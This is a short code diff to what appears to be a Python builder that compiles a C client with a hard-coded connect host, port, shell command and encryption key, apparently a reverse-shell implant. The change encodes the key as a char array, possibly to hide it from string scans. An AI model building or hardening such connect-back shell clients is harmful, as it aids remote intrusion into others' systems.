@@ -24,6 +24,10 @@ def _c_string_escape(s: str) -> str:
     )
 
 
+def _c_char_array_escape(s: bytes) -> str:
+    return "(char[]) {{ {} }}".format(", ".join(map(str, s)))
+
+
 async def compile_client(
     encryption_key: str,
     host: tuple[str, int],
@@ -39,7 +43,7 @@ async def compile_client(
     hostname, port = host
 
     defines = {
-        "ENCRYPTION_KEY": _c_string_escape(encryption_key),
+        "ENCRYPTION_KEY": _c_char_array_escape(encryption_key.encode()),
         "CONNECT_HOST": _c_string_escape(hostname),
         "CONNECT_PORT": port,
         "SHELL_COMMAND": _c_string_escape(shell_command),
